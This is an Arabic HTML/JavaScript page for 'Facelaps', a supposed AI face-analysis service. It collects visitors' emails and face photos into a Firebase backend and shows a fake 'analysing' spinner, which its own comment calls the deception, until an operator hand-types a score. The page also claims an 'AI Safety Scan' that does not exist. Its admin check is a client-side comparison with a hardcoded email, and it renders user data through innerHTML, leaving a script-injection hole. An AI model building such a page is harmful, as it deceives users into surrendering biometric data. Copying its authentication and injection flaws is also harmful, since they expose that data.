<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facelaps | مختبر التحليل الذكي</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Cairo:wght@300;600&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background-color: #050505; font-family: 'Cairo', sans-serif; color: white; overflow-x: hidden; }
        #canvas-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
        .glass-ui { background: rgba(15, 23, 42, 0.75); backdrop-filter: blur(20px); border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 2.5rem; }
        .neon-brand { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px #00f2ff; letter-spacing: 2px; }
        #adminSection { display: none; background: #f3f4f6; color: #111827; min-height: 100vh; position: relative; z-index: 1000; padding: 2rem; }
        .img-preview-box { width: 100%; height: 280px; object-fit: cover; border-radius: 1.5rem; display: none; border: 2px solid #00f2ff; box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
    </style>
</head>
<body>

    <div id="canvas-bg"></div>

    <!-- واجهة المستخدم (Facelaps) -->
    <div id="userSection" class="min-h-screen flex items-center justify-center p-4">
        <div class="glass-ui max-w-md w-full p-10 shadow-2xl">
            <div class="text-center mb-10">
                <h1 class="neon-brand text-5xl text-cyan-400 italic font-bold">FACELAPS</h1>
                <p class="text-[10px] text-gray-400 tracking-[0.5em] mt-3 uppercase">Neural Analysis Core</p>
            </div>

            <!-- خطوة 1: الدخول -->
            <div id="step1" class="space-y-5">
                <div class="relative">
                    <input type="email" id="userEmail" placeholder="أدخل الجيميل الخاص بك" 
                        class="w-full bg-black/50 border border-gray-700 p-4 rounded-2xl text-center outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400 transition-all">
                </div>
                <button onclick="nextStep()" class="w-full py-4 bg-cyan-600 rounded-2xl font-bold hover:bg-cyan-500 transition-transform active:scale-95 shadow-lg shadow-cyan-900/20">دخول المختبر</button>
            </div>

            <!-- خطوة 2: الرفع والانتظار -->
            <div id="step2" class="hidden space-y-6">
                <div id="uploadBox" class="border-2 border-dashed border-cyan-900/50 rounded-3xl p-6 text-center cursor-pointer hover:bg-cyan-400/5 transition-all group">
                    <input type="file" id="imageInput" class="hidden" accept="image/*" onchange="handlePreview(event)">
                    <div id="promptText" class="py-10">
                        <div class="text-4xl mb-3 group-hover:scale-110 transition-transform">📸</div>
                        <p class="text-cyan-400 font-medium">ارفع صورتك للتحليل</p>
                        <p class="text-[9px] text-gray-500 mt-2 uppercase tracking-widest">AI Safety Scan Enabled</p>
                    </div>
                    <img id="imagePreview" class="img-preview-box">
                </div>
                
                <button id="sendBtn" onclick="uploadData()" class="w-full py-4 bg-gradient-to-r from-cyan-600 to-blue-700 rounded-2xl font-bold shadow-xl">بدء المسح النبضي</button>
                
                <!-- حالة التحليل (الخداع) -->
                <div id="status" class="text-center py-6 hidden">
                    <div class="flex justify-center mb-4">
                        <div class="w-12 h-12 border-4 border-cyan-400 border-t-transparent rounded-full animate-spin"></div>
                    </div>
                    <div class="animate-pulse text-cyan-400 font-bold">⚡ جاري تحليل ملامح الوجه...</div>
                    <p class="text-[10px] text-gray-500 mt-2">يرجى الانتظار، يتم الآن مطابقة البيانات مع السحابة</p>
                </div>

                <!-- النتيجة النهائية (تظهر بعد رد الإدارة) -->
                <div id="finalResult" class="hidden text-center p-8 bg-cyan-950/30 border border-cyan-500/50 rounded-[2rem] animate-bounce-short">
                    <p class="text-xs text-cyan-300 uppercase tracking-widest mb-2">النتيجة النهائية</p>
                    <div id="scoreText" class="text-6xl font-black text-white font-mono tracking-tighter">--</div>
                </div>
            </div>

            <button onclick="adminLogin()" class="w-full mt-12 text-[10px] text-gray-700 hover:text-cyan-400 transition-colors italic uppercase tracking-widest">Subscriber Login</button>
        </div>
    </div>

    <!-- لوحة الإدارة (البدائية) -->
    <div id="adminSection">
        <div class="max-w-5xl mx-auto">
            <div class="flex justify-between items-center border-b-4 border-black pb-4 mb-8">
                <h1 class="text-4xl font-black uppercase">Admin Panel / طلبات المختبر</h1>
                <button onclick="location.reload()" class="bg-black text-white px-8 py-2 font-bold">خروج</button>
            </div>
            <div id="adminCards" class="space-y-6">
                <!-- الصور والطلبات تظهر هنا -->
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getStorage, ref as sRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
        import { getDatabase, ref, push, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCd6mOpEJyiUSAAhmm2NbhT80MMY0UQJcc",
            authDomain: "project-fe025bb5-b1cc-4b8f-93e.firebaseapp.com",
            databaseURL: "https://project-fe025bb5-b1cc-4b8f-93e-default-rtdb.firebaseio.com",
            projectId: "project-fe025bb5-b1cc-4b8f-93e",
            storageBucket: "project-fe025bb5-b1cc-4b8f-93e.firebasestorage.app",
            messagingSenderId: "148069353954",
            appId: "1:148069353954:web:783adf7e8a0c796393d1bb"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const storage = getStorage(app);

        // تشغيل خلفية Vanta
        try {
            VANTA.NET({ el: "#canvas-bg", mouseControls: true, touchControls: true, color: 0x00f2ff, backgroundColor: 0x050505, points: 10, maxDistance: 20, spacing: 18 });
        } catch(e) {}

        window.nextStep = () => {
            const email = document.getElementById('userEmail').value;
            if(email.includes('@')) {
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            } else { alert("أدخل بريد إلكتروني صحيح"); }
        };
        
        document.getElementById('uploadBox').onclick = () => document.getElementById('imageInput').click();

        window.handlePreview = (e) => {
            const file = e.target.files[0];
            if(file) {
                const reader = new FileReader();
                reader.onload = (ev) => {
                    document.getElementById('imagePreview').src = ev.target.result;
                    document.getElementById('imagePreview').style.display = 'block';
                    document.getElementById('promptText').classList.add('hidden');
                };
                reader.readAsDataURL(file);
            }
        };

        window.uploadData = async () => {
            const file = document.getElementById('imageInput').files[0];
            const email = document.getElementById('userEmail').value;
            if(!file) return alert("الرجاء اختيار صورة");

            document.getElementById('sendBtn').classList.add('hidden');
            document.getElementById('status').classList.remove('hidden');

            try {
                const storageRef = sRef(storage, 'facelaps/' + Date.now() + "_" + file.name);
                await uploadBytes(storageRef, file);
                const url = await getDownloadURL(storageRef);

                const newReq = await push(ref(db, 'lab_requests'), {
                    email: email,
                    image: url,
                    status: "waiting",
                    result: "",
                    timestamp: Date.now()
                });

                // مراقبة الرد من الأدمن
                onValue(ref(db, `lab_requests/${newReq.key}`), (snap) => {
                    const data = snap.val();
                    if(data && data.status === "completed") {
                        document.getElementById('status').classList.add('hidden');
                        document.getElementById('finalResult').classList.remove('hidden');
                        document.getElementById('scoreText').innerText = data.result;
                    }
                });
            } catch(e) { alert("فشل في الاتصال بالمختبر"); }
        };

        // الأدمن
        window.adminLogin = () => {
            const auth = prompt("Login ID:");
            if(auth === "modygg240@gmail.com") {
                document.getElementById('userSection').style.display = 'none';
                document.getElementById('adminSection').style.display = 'block';
                document.getElementById('canvas-bg').style.display = 'none';
                initAdmin();
            } else { alert("Unauthorized Access"); }
        };

        function initAdmin() {
            onValue(ref(db, 'lab_requests'), (snapshot) => {
                const container = document.getElementById('adminCards');
                container.innerHTML = "";
                snapshot.forEach(child => {
                    const data = child.val();
                    const card = document.createElement('div');
                    card.className = "bg-white border-4 border-black p-6 flex flex-col md:flex-row gap-6 items-center shadow-[8px_8px_0px_#000]";
                    card.innerHTML = `
                        <img src="${data.image}" class="w-48 h-48 object-cover border-4 border-black">
                        <div class="flex-1 space-y-2">
                            <p class="text-xl font-bold">المستخدم: <span class="font-normal">${data.email}</span></p>
                            <p class="text-sm text-gray-500">الحالة: ${data.status}</p>
                            <div class="flex gap-3 mt-4">
                                <input type="text" id="res-${child.key}" placeholder="التقييم (مثلاً 100/100)" class="border-2 border-black p-3 flex-1 font-bold">
                                <button onclick="submitResult('${child.key}')" class="bg-blue-600 text-white px-6 font-bold border-2 border-black hover:bg-blue-700">إرسال للمستخدم</button>
                            </div>
                        </div>
                    `;
                    container.prepend(card);
                });
            });
        }

        window.submitResult = (id) => {
            const val = document.getElementById(`res-${id}`).value;
            if(!val) return alert("اكتب التقييم أولاً");
            update(ref(db, `lab_requests/${id}`), {
                result: val,
                status: "completed"
            }).then(() => alert("تم إرسال النتيجة!"));
        };
    </script>
</body>
</html>
